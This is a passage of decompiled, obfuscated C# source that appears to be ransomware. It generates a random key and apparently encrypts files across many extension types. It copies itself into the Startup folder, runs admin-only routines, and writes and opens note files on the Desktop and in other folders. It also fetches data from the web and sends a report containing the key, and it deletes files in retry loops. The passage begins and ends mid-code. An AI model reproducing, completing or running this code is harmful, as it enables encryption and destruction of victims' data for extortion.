							else if (!dHWQzBpmcn)
							{
								OAyPyXfJFHzyE.pjoDpqAxNLvCK(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CiXuUORQDucyebW, NRMuHnCdQTWUX);
							}
							else
							{
								OAyPyXfJFHzyE.pjoDpqAxNLvCK(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CiXuUORQDucyebW, text, bytes);
							}
						}
						else
						{
							if (bpZBDgMzOhYn)
							{
								aBgVqDzNPCJQ = qJZaPzetTV + aBgVqDzNPCJQ;
							}
							string text2 = HxsVTRcRgpiH.RPPZNxOHyFu(32);
							string s2 = yeiIYsgqfPPobuZc.cWgNetVEfgEv(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (aBgVqDzNPCJQ != getString_0(107389436))
							{
								if (!bEJKBhTzHL)
								{
									if (!dHWQzBpmcn)
									{
										wjPMLlmajetI(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + aBgVqDzNPCJQ, WwvaLWuUsMuy);
									}
									else
									{
										wjPMLlmajetI(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + aBgVqDzNPCJQ, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!dHWQzBpmcn)
										{
											CQSgBNnEZGz(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + aBgVqDzNPCJQ, WwvaLWuUsMuy);
										}
										else
										{
											CQSgBNnEZGz(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + aBgVqDzNPCJQ, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex6)
									{
										if (SsCiUkhFaPaV)
										{
											try
											{
												File.AppendAllText(eBcYzZJOdxm, getString_0(107389171) + CS_0024_003C_003E8__locals0.hpBPJRIyXygh + getString_0(107389390) + ex6.Message + getString_0(107396695));
											}
											catch (Exception)
											{
											}
										}
										BFoWsrHVmkbzUDmB++;
										return;
									}
								}
							}
							else if (!bEJKBhTzHL)
							{
								if (!dHWQzBpmcn)
								{
									wjPMLlmajetI(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + getString_0(107389431), WwvaLWuUsMuy);
								}
								else
								{
									wjPMLlmajetI(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + getString_0(107389431), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!dHWQzBpmcn)
									{
										CQSgBNnEZGz(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh, WwvaLWuUsMuy);
									}
									else
									{
										CQSgBNnEZGz(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex8)
								{
									if (SsCiUkhFaPaV)
									{
										try
										{
											File.AppendAllText(eBcYzZJOdxm, getString_0(107389171) + CS_0024_003C_003E8__locals0.hpBPJRIyXygh + getString_0(107389390) + ex8.Message + getString_0(107396695));
										}
										catch (Exception)
										{
										}
									}
									BFoWsrHVmkbzUDmB++;
									return;
								}
							}
							if (dHWQzBpmcn)
							{
								if (aBgVqDzNPCJQ != getString_0(107389436))
								{
									ulbKceXLNzC(CS_0024_003C_003E8__locals0.hpBPJRIyXygh + aBgVqDzNPCJQ, bytes2);
								}
								else
								{
									ulbKceXLNzC(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, bytes2);
								}
							}
						}
						end_IL_0656_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d56;
			IL_0d56:
			vgijhoARFhV.Remove(CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
		}

		static onnLxZACFDoQRfFR()
		{
			Strings.CreateGetStringDelegate(typeof(onnLxZACFDoQRfFR));
		}
	}

	private sealed class JraJWxYgDVYNbR
	{
		public string zhVVNYGbZQcrX;

		public string DmdUSqdmWxRohM;

		public void _003CEncrypt2_003Eb__43()
		{
			while (true)
			{
				try
				{
					File.Delete(zhVVNYGbZQcrX);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					if (File.Exists(DmdUSqdmWxRohM))
					{
						File.Delete(DmdUSqdmWxRohM);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string DRPtrRarqnZhQ;

	public static byte[] WwvaLWuUsMuy;

	public static string SqCSaFJrwXuBuO;

	public static string peIBzCUyrIICrp;

	public static List<string> vaSLUTUbjeY;

	public static List<string> qvQITLkknYg;

	public static string wnDiQIMWsMjP;

	public static string NRMuHnCdQTWUX;

	public static string hlkjzPFfXjrEc;

	public static string SNAuLiPuLKioXr;

	public static int WKCoBXAFCAZNg;

	public static string nSEgZCqbKaXqV;

	public static string OYBipZCrcXNH;

	public static string rEspfQtigPTwQN;

	public static string mwYFUnpJUrJi;

	public static string eJRGmzGrfjhI;

	public static string ZCLtjyZjWZrKzeXI;

	public static string vlKMEVvYQSGwChf;

	public static string XklJeizwoKyzsVC;

	public static List<string> wqqBwrXAQMhONm;

	public static List<string> wGUqZKpPfawraYO;

	public static string YRJBQgLVUguPTZP;

	public static string PYbHGaJGFJZl;

	public static string rcxTEKCmuvTVT;

	public static List<string> LfbVDKLAiBGoZzsY;

	public static string onhVybuhTZhWQWa;

	private static string FyXMEKRnlKoKP;

	public static string GLHMCZIBTJO;

	public static string plUEwiNwSwDP;

	public static List<string> adLbaicOXAzUc;

	public static List<string> UVpQTTmnwTapUSsO;

	public static List<string> JfNhBrPHaPG;

	public static List<string> hrvpUvZQVch;

	public static string BCwMNEaFehJEAEW;

	public static List<string> NQvyRawduvn;

	public static List<string> DseODPGHlUJHTz;

	public static string ymWcmHxKFUK;

	public static string LLXcNOUYCyLKioNte;

	internal static DateTime AUWmIJosBaevVTa;

	internal static DateTime YRRZHNAFPrwNg;

	public static string TmUHufxiasI;

	public static string CiXuUORQDucyebW;

	public static string MQqcnUjJySJW;

	public static string FqhbHLSZqIJC;

	public static string lHAXyMZIermpoZjN;

	public static string AgwsOdCnYfgNBXq;

	public static string hIdEvNFMPZXAZxU;

	public static string NovBIDwMVoo;

	public static List<string> EDjNxpdqMiO;

	public static string PZbbmsztNpThUc;

	public static string qPOqWisoNZy;

	public static string mjZuhRNsUai;

	public static string ziOEkhTdjqOs;

	public static string DdCvxPcpqIjlBe;

	public static string FVsxbyFxxBuvQ;

	public static string EZPgdGEvHHvKM;

	public static string rgbJnxRRJSwteYY;

	public static string wMWziBNyrG;

	public static string gfqhvdfKgsfP;

	public static string uBEJzCKjTTQw;

	public static string HRPqOxfknYLQzX;

	public static string asKNcrEUSHf;

	public static string cHjaHHbOia;

	public static string WhZItuUkxEPNS;

	public static string rIeYkrSOyhlxSLf;

	public static string EavVpVWaUEtkSX;

	public static string uUBDMgTKkvJQpi;

	public static string KWPVAHhGPhNIICC;

	public static string xDhcruhrTvVZb;

	public static string uixeymWYYDLeKYE;

	public static string APHQeaBfdYNB;

	public static string rEMZInNhyyY;

	public static string RzBNrFuKFlhr;

	public static string hLKVRldzJzt;

	public static string gkdVmSrBXFMvvU;

	public static string PvwxfopQfRocU;

	public static string pZpzrWQSyVUq;

	public static string edUQHPvprdg;

	public static string[] vhPoJYKYool;

	public static string OFRFzhlcWBOLOw;

	public static bool uBTtlGfiltatoKc;

	public static string bGIxAZwJUJakn;

	public static bool dHWQzBpmcn;

	public static bool kaYXkHHFquKVslEia;

	public static bool KgqHpyJnNWXWNav;

	public static bool pskvCcQfNWIZ;

	public static string eBcYzZJOdxm;

	public static bool SsCiUkhFaPaV;

	public static bool LxmtFaCyczZey;

	public static bool HQsMhnOffkyCiI;

	public static bool YBZiXtOnyfJCXsA;

	public static bool bEJKBhTzHL;

	public static string xOMcrEjNtvCmv;

	public static bool QcLKmXknCOYlGGyu;

	public static Stopwatch OdPWTsJLcGrySc;

	public static int BFoWsrHVmkbzUDmB;

	public static int RVAcslUCYF;

	public static bool bpZBDgMzOhYn;

	public static string qJZaPzetTV;

	public static List<string> IEBbLHGfuE;

	public static List<string> hMYsqEPgcjeZT;

	public static List<string> KbzkVVvOms;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate18;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate19;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		if (args.Length == 0 && EZPgdGEvHHvKM == getString_0(107396888))
		{
			try
			{
				rfQRQwiJMNWh CS_0024_003C_003E8__locals0 = new rfQRQwiJMNWh();
				CS_0024_003C_003E8__locals0.nukJnuoWJwW = Process.GetCurrentProcess().ProcessName;
				if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.nukJnuoWJwW) > 1)
				{
					return;
				}
			}
			catch (Exception)
			{
			}
		}
		if (args.Length == 0 && EZPgdGEvHHvKM == getString_0(107396888))
		{
			try
			{
				TKWQNdkfkJIyWR.WJWtERWezV(FyXMEKRnlKoKP);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (gkdVmSrBXFMvvU == getString_0(107396883))
			{
				Thread thread = new Thread(uArMZTgTTxEbfu.HNogcIdibEs);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (rEspfQtigPTwQN == getString_0(107396883))
		{
			Thread.Sleep(int.Parse(mwYFUnpJUrJi));
		}
		if (mjZuhRNsUai == getString_0(107396883))
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					DMYYaczBvTmMS CS_0024_003C_003E8__locals1 = new DMYYaczBvTmMS();
					CS_0024_003C_003E8__locals1.UYOPscsWJOHBH = new string[4]
					{
						yasjygrGJqTJ(getString_0(107396910)),
						yasjygrGJqTJ(getString_0(107396861)),
						yasjygrGJqTJ(getString_0(107396876)),
						yasjygrGJqTJ(getString_0(107396815))
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						GsoClIYtJBCmx.xXsswAMuAoNvDiei(CS_0024_003C_003E8__locals1.UYOPscsWJOHBH);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				NioVLbHzUECEb.hEryIUEGXfD(yasjygrGJqTJ(getString_0(107396861)));
			}
			catch
			{
			}
			try
			{
				NioVLbHzUECEb.hEryIUEGXfD(yasjygrGJqTJ(getString_0(107396815)));
			}
			catch
			{
			}
			try
			{
				NioVLbHzUECEb.hEryIUEGXfD(yasjygrGJqTJ(getString_0(107396798)));
			}
			catch
			{
			}
			try
			{
				NioVLbHzUECEb.hEryIUEGXfD(yasjygrGJqTJ(getString_0(107396876)));
			}
			catch
			{
			}
			Thread thread3 = new Thread(GsoClIYtJBCmx.KokqrBVpKYNj);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && hIdEvNFMPZXAZxU == getString_0(107396883))
		{
			try
			{
				cWWugKCAwQiFRX(yasjygrGJqTJ(getString_0(107396813)));
			}
			catch
			{
			}
		}
		try
		{
			if (vlKMEVvYQSGwChf == getString_0(107396883) && bNsSOPhOHwmffKiE.QXxYkAyvYdexhwC())
			{
				new QbVoWdWNfYVfJa().KeWMEcNvryPfrNG(bool_0: false);
				bNsSOPhOHwmffKiE.EioQIcLwwClrZ();
			}
		}
		catch (Exception)
		{
		}
		if (PYbHGaJGFJZl == getString_0(107396883) && bNsSOPhOHwmffKiE.QXxYkAyvYdexhwC())
		{
			new QbVoWdWNfYVfJa().KeWMEcNvryPfrNG(bool_0: false);
			new QbVoWdWNfYVfJa().xLaaLHnxlsRXD();
		}
		if (OYBipZCrcXNH == getString_0(107396883))
		{
			TtUttwvOqqCtgbAm.vgpiIfmswR();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397220);
			string text2 = text + Path.GetFileName(fileName);
			if (SNAuLiPuLKioXr == getString_0(107396883) && fileName != text2)
			{
				Thread thread4 = new Thread(SZSLZkwYSb);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (wnDiQIMWsMjP == getString_0(107396883) && mainModule != null && fileName != text2)
			{
				try
				{
					WKCoBXAFCAZNg = jRGoztevgCp(0, wqqBwrXAQMhONm.Count);
					File.Copy(fileName, text + wqqBwrXAQMhONm[WKCoBXAFCAZNg], overwrite: true);
					Process.Start(text + wqqBwrXAQMhONm[WKCoBXAFCAZNg]);
					bTiDiDmJuclvC();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (ymWcmHxKFUK == getString_0(107396883) && DateTime.Now < AUWmIJosBaevVTa)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (LLXcNOUYCyLKioNte == getString_0(107396883) && DateTime.Now > YRRZHNAFPrwNg)
			{
				bTiDiDmJuclvC();
			}
		}
		catch
		{
		}
		auEwOkBUFBp();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate
			{
				List<string> uVpQTTmnwTapUSsO = UVpQTTmnwTapUSsO;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						dpCBMnJAbTYLKem(getString_0(107389350), string_0);
					};
				}
				Parallel.ForEach(uVpQTTmnwTapUSsO, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				List<string> source = adLbaicOXAzUc;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						dpCBMnJAbTYLKem(getString_0(107392209), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
				List<string> jfNhBrPHaPG = JfNhBrPHaPG;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
					{
						dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107389309)), string_0);
					};
				}
				Parallel.ForEach(jfNhBrPHaPG, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
				if (edUQHPvprdg == getString_0(107396883))
				{
					string[] source2 = vhPoJYKYool;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
						{
							dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107389309)), getString_0(107389316) + string_0 + getString_0(107388763));
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
				}
				if (!hpcvcOchTBoC().Contains(getString_0(107389498)))
				{
					IxgZHDLTHUruQ(BCwMNEaFehJEAEW);
				}
				else
				{
					List<string> source3 = hrvpUvZQVch;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
						{
							dpCBMnJAbTYLKem(yasjygrGJqTJ(IeLtjAHHavBrLSv(getString_0(107388758))), string_0);
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
				}
				List<string> nQvyRawduvn = NQvyRawduvn;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b = delegate(string string_0)
					{
						dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107388733)), string_0);
					};
				}
				Parallel.ForEach(nQvyRawduvn, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b);
				List<string> dseODPGHlUJHTz = DseODPGHlUJHTz;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c = delegate(string string_0)
					{
						dpCBMnJAbTYLKem(getString_0(107388748), string_0);
					};
				}
				Parallel.ForEach(dseODPGHlUJHTz, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1c);
			};
		}
		Thread thread5 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && KgqHpyJnNWXWNav)
			{
				try
				{
					Thread thread6 = new Thread(yxcHpdrQPlqshJa.ZurNMOMYmWzCS);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			dpCBMnJAbTYLKem(getString_0(107397215), yasjygrGJqTJ(getString_0(107397170)));
			dpCBMnJAbTYLKem(getString_0(107397215), yasjygrGJqTJ(getString_0(107397129)));
			dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107397040)), yasjygrGJqTJ(getString_0(107397059)));
			dpCBMnJAbTYLKem(yasjygrGJqTJ(getString_0(107397040)), yasjygrGJqTJ(getString_0(107396417)));
		}
		if (YRJBQgLVUguPTZP == getString_0(107396883) && vQLLevSAHRLm() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread7 = new Thread(GptWEElvInK.tgoQrdgpZFHkZtd);
			thread7.IsBackground = false;
			thread7.Priority = ThreadPriority.Normal;
			thread7.Start();
		}
		_ = plUEwiNwSwDP == getString_0(107396883);
		SecureString secureString = new SecureString();
		if (MQqcnUjJySJW == getString_0(107396888))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			NRMuHnCdQTWUX = getString_0(107396243);
		}
		hlkjzPFfXjrEc = yeiIYsgqfPPobuZc.cWgNetVEfgEv(NpueiVmmpoUARB(secureString));
		if (HQsMhnOffkyCiI)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), xOMcrEjNtvCmv)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), xOMcrEjNtvCmv), string.Concat(yasjygrGJqTJ(getString_0(107396230)), new WebClient().DownloadString(yasjygrGJqTJ(getString_0(107396717))), getString_0(107396676), yasjygrGJqTJ(getString_0(107396671)), DateTime.Now, getString_0(107396676), yasjygrGJqTJ(getString_0(107396598)), hlkjzPFfXjrEc));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), xOMcrEjNtvCmv), getString_0(107396541) + hlkjzPFfXjrEc);
				}
			}
			catch (Exception ex7)
			{
				if (SsCiUkhFaPaV)
				{
					try
					{
						File.AppendAllText(eBcYzZJOdxm, getString_0(107396544) + ex7.Message + getString_0(107396676));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		sSfkouVnjTloRKi.NqwpFgBPUpN(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), xDhcruhrTvVZb), OhhtBduWIan(hlkjzPFfXjrEc), null, null, getString_0(107396463), getString_0(107395934), null);
		if (asKNcrEUSHf == getString_0(107396883))
		{
			try
			{
				FwrsrVdxML();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			idgipesIlmkq();
		}
		try
		{
			QvaRAoZOVYdBT(new string[1] { getString_0(107395949) }, new string[100]
			{
				getString_0(107395940),
				getString_0(107395935),
				getString_0(107395898),
				getString_0(107395889),
				getString_0(107395916),
				getString_0(107395911),
				getString_0(107395906),
				getString_0(107395869),
				getString_0(107395864),
				getString_0(107395859),
				getString_0(107395886),
				getString_0(107395881),
				getString_0(107395872),
				getString_0(107395835),
				getString_0(107395826),
				getString_0(107395853),
				getString_0(107395848),
				getString_0(107395843),
				getString_0(107395806),
				getString_0(107395801),
				getString_0(107395792),
				getString_0(107395819),
				getString_0(107395814),
				getString_0(107395809),
				getString_0(107395772),
				getString_0(107395767),
				getString_0(107395762),
				getString_0(107395789),
				getString_0(107395784),
				getString_0(107395779),
				getString_0(107395742),
				getString_0(107395737),
				getString_0(107395732),
				getString_0(107395727),
				getString_0(107395750),
				getString_0(107395745),
				getString_0(107395708),
				getString_0(107395703),
				getString_0(107395906),
				getString_0(107395698),
				getString_0(107395864),
				getString_0(107395721),
				getString_0(107395716),
				getString_0(107395711),
				getString_0(107396186),
				getString_0(107396181),
				getString_0(107396176),
				getString_0(107396203),
				getString_0(107396198),
				getString_0(107396193),
				getString_0(107396156),
				getString_0(107396151),
				getString_0(107396146),
				getString_0(107396173),
				getString_0(107396168),
				getString_0(107396163),
				getString_0(107396126),
				getString_0(107396121),
				getString_0(107396112),
				getString_0(107396139),
				getString_0(107396130),
				getString_0(107396085),
				getString_0(107396104),
				getString_0(107396099),
				getString_0(107396058),
				getString_0(107396049),
				getString_0(107396072),
				getString_0(107396063),
				getString_0(107396022),
				getString_0(107396017),
				getString_0(107396040),
				getString_0(107396031),
				getString_0(107395990),
				getString_0(107395985),
				getString_0(107396012),
				getString_0(107396007),
				getString_0(107396002),
				getString_0(107395965),
				getString_0(107395960),
				getString_0(107395951),
				getString_0(107395978),
				getString_0(107395973),
				getString_0(107395968),
				getString_0(107395419),
				getString_0(107395414),
				getString_0(107395437),
				getString_0(107395428),
				getString_0(107395423),
				getString_0(107395732),
				getString_0(107395386),
				getString_0(107395381),
				getString_0(107395376),
				getString_0(107395403),
				getString_0(107395398),
				getString_0(107395357),
				getString_0(107395352),
				getString_0(107395347),
				getString_0(107395370),
				getString_0(107395365),
				getString_0(107395360)
			}, new string[0], NpueiVmmpoUARB(secureString), getString_0(107395323));
		}
		catch (Exception ex9)
		{
			if (SsCiUkhFaPaV)
			{
				try
				{
					File.AppendAllText(eBcYzZJOdxm, getString_0(107395342) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395285)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395285));
				streamWriter.WriteLine(yasjygrGJqTJ(getString_0(107395252)));
				streamWriter.WriteLine(getString_0(107396676));
				streamWriter.WriteLine(yasjygrGJqTJ(getString_0(107393650)));
				streamWriter.WriteLine(hlkjzPFfXjrEc);
				if (GLHMCZIBTJO == getString_0(107396888))
				{
					streamWriter.WriteLine(getString_0(107396676));
					streamWriter.WriteLine(yasjygrGJqTJ(getString_0(107394129)) + Convert.ToString(LfbVDKLAiBGoZzsY.Count));
				}
				if (bpZBDgMzOhYn)
				{
					streamWriter.WriteLine(getString_0(107396676));
					streamWriter.WriteLine(yasjygrGJqTJ(getString_0(107394084)));
					streamWriter.WriteLine(OMlrSKpvSZZjN.GGrCySNwdT());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395285));
				if (!text3.Contains(hlkjzPFfXjrEc) && !dHWQzBpmcn)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395285), getString_0(107394051) + hlkjzPFfXjrEc);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in wGUqZKpPfawraYO)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395285)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395285), item + getString_0(107395285), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395285));
					if (!text4.Contains(hlkjzPFfXjrEc) && !dHWQzBpmcn)
					{
						File.AppendAllText(item + getString_0(107395285), getString_0(107394051) + hlkjzPFfXjrEc);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!pskvCcQfNWIZ && num > 10)
			{
				break;
			}
		}
		if (rEMZInNhyyY == getString_0(107396883))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394022)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394022));
					streamWriter2.WriteLine(yasjygrGJqTJ(getString_0(107393989)));
					streamWriter2.WriteLine(getString_0(107396676));
					streamWriter2.WriteLine(yasjygrGJqTJ(getString_0(107393940)));
					streamWriter2.WriteLine(hlkjzPFfXjrEc + yasjygrGJqTJ(getString_0(107393339)));
					if (GLHMCZIBTJO == getString_0(107396888))
					{
						streamWriter2.WriteLine(getString_0(107396676));
						streamWriter2.WriteLine(yasjygrGJqTJ(getString_0(107393358)) + yasjygrGJqTJ(getString_0(107394129)) + Convert.ToString(LfbVDKLAiBGoZzsY.Count) + yasjygrGJqTJ(getString_0(107393339)));
					}
					if (bpZBDgMzOhYn)
					{
						streamWriter2.WriteLine(getString_0(107396676));
						streamWriter2.WriteLine(yasjygrGJqTJ(getString_0(107394084)));
						streamWriter2.WriteLine(OMlrSKpvSZZjN.GGrCySNwdT());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395285));
					if (!text5.Contains(hlkjzPFfXjrEc) && !dHWQzBpmcn)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394022), yasjygrGJqTJ(getString_0(107393358)) + getString_0(107394051) + hlkjzPFfXjrEc + yasjygrGJqTJ(getString_0(107393339)));
					}
				}
			}
			catch
			{
			}
		}
		if (onhVybuhTZhWQWa == getString_0(107396883))
		{
			try
			{
				if (GLHMCZIBTJO == getString_0(107396888))
				{
					OMlrSKpvSZZjN.ipLbbfoZtAQpboH(getString_0(107393265), getString_0(107393292), getString_0(107393279), string.Concat(yasjygrGJqTJ(getString_0(107396230)), new WebClient().DownloadString(yasjygrGJqTJ(getString_0(107396717))), getString_0(107393238), yasjygrGJqTJ(getString_0(107396671)), DateTime.Now, getString_0(107396676), yasjygrGJqTJ(getString_0(107393233)), Convert.ToString(LfbVDKLAiBGoZzsY.Count), getString_0(107396676), yasjygrGJqTJ(getString_0(107396598)), hlkjzPFfXjrEc));
				}
				else
				{
					OMlrSKpvSZZjN.ipLbbfoZtAQpboH(getString_0(107393265), getString_0(107393292), getString_0(107393279), string.Concat(yasjygrGJqTJ(getString_0(107396230)), new WebClient().DownloadString(yasjygrGJqTJ(getString_0(107396717))), getString_0(107393238), yasjygrGJqTJ(getString_0(107396671)), DateTime.Now, getString_0(107396676), yasjygrGJqTJ(getString_0(107393233)), Convert.ToString(LfbVDKLAiBGoZzsY.Count), getString_0(107396676), yasjygrGJqTJ(getString_0(107396598)), hlkjzPFfXjrEc));
				}
			}
			catch
			{
			}
		}
		if (XklJeizwoKyzsVC == getString_0(107396883))
		{
			try
			{
				aKBCHebRRFSgA.EORjRqpccbahn(new Uri(getString_0(107393216)));
			}
			catch
			{
			}
		}
		if (rEMZInNhyyY == getString_0(107396888))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395285)))
				{
					Process.Start(yasjygrGJqTJ(getString_0(107393215)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395285));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394022)))
				{
					Process.Start(yasjygrGJqTJ(getString_0(107393190)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394022));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(FVsxbyFxxBuvQ))
		{
			try
			{
				File.Delete(FVsxbyFxxBuvQ);
			}
			catch
			{
			}
		}
		if (SsCiUkhFaPaV)
		{
			try
			{
